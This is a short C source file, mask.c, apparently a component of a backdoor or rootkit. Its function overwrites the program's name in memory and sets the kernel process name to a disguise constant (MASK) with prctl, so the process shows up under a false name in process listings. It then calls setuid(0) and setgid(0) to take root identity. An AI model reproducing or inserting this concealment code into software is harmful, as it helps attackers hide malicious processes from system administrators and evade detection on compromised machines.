/*
 * mask.c
 *
 *  Created on: May 16, 2014
 *      Author: root
 */


#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <stdio.h>

#include "defs.h"
#include "util.h"

void mask_prog(char *name)
{
	// mask the process name
	memset(name, 0, strlen(name));
	strcpy(name, MASK);

	if (prctl(PR_SET_NAME, MASK, 0, 0) < 0)
		error("prctl");

	// change the UID/GID to 0 (raise privs)
	if (setuid(0) < 0)
		perror("setuid");
	if (setgid(0) < 0)
		error("setgid");
}
